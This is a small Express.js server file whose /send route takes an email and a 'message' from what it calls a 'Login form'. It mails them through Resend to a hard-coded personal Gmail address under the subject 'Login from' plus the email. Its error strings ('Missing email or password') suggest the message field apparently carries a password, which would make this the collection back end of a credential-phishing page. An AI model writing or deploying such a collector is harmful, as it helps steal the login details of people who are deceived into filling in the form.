const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const { Resend } = require('resend');

const app = express();
app.use(bodyParser.json());
app.use(cors());

// Initialize Resend with your API key from Render environment variables
const resend = new Resend(process.env.RESEND_API_KEY);

// ✅ Root route to test backend
app.get('/', (req, res) => {
  res.send('Backend is live ✅');
});

// ✅ Route to handle form submission
app.post('/send', async (req, res) => {
  const { email, message } = req.body;

  if (!email || !message) {
    return res.status(400).json({ error: 'Missing email or password' });
  }

  try {
    await resend.emails.send({
      from: "NoReply <onboarding@resend.dev>",   // Resend test sender
      to: "glowemeka@gmail.com",           // Replace with your personal inbox
      subject: `Login from ${email}`,
      text: `You received a new message from the Login form.\n\nSender email: ${email}\n\nMessage:\n${message}`,
      reply_to: email // lets you reply directly to the person who filled the form
    });

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Error loggin in' });
  }
});

// ✅ Only one app.listen, uses Render's PORT
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

